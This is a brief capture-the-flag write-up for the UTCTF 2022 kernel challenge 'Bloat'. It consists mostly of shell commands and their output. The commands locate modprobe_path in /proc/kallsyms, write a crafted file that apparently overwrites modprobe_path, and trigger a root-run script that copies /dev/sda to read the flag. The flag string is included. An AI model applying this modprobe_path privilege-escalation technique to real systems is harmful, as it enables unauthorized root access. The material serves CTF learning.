# Bloat  
```
Login with username bloat and no password
```
```
# cat /proc/kallsyms | grep modprobe
ffffffff81073100 t free_modprobe_argv
ffffffff82038180 D modprobe_path
```
```
$ echo -ne '\x80\x81\x03\x82\xff\xff\xff\xff/tmp/a\x00' > /tmp/b.bloat
echo -ne '\x80\x81\x03\x82\xff\xff\xff\xff/tmp/a\x00' > /tmp/b.bloat
$ echo -ne '#!/bin/sh\ncp /dev/sda /tmp/flag' > /tmp/a
echo -ne '#!/bin/sh\ncp /dev/sda /tmp/flag' > /tmp/a
$ echo -ne '\xff\xff\xff\xff' > /tmp/c
echo -ne '\xff\xff\xff\xff' > /tmp/c
$ chmod +x /tmp/a /tmp/b.bloat /tmp/c
chmod +x /tmp/a /tmp/b.bloat /tmp/c
$ /tmp/b.bloat
/tmp/b.bloat
Segmentation fault
$ /tmp/c
/tmp/c
/tmp/c: line 1: ����: not found
$ cat /tmp/flag
cat /tmp/flag
utflag{oops_forgot_to_use_put_user283558318}
```

flag: `utflag{oops_forgot_to_use_put_user283558318}`

[https://heinen.dev/utctf-2022/](https://heinen.dev/utctf-2022/)  
[https://gist.github.com/ReDucTor/4054fc4509e34979fb66ee78405fa45f](https://gist.github.com/ReDucTor/4054fc4509e34979fb66ee78405fa45f)  
[https://github.com/nobodyisnobody/write-ups/tree/main/UTCTF.2022/pwn/bloat](https://github.com/nobodyisnobody/write-ups/tree/main/UTCTF.2022/pwn/bloat)  
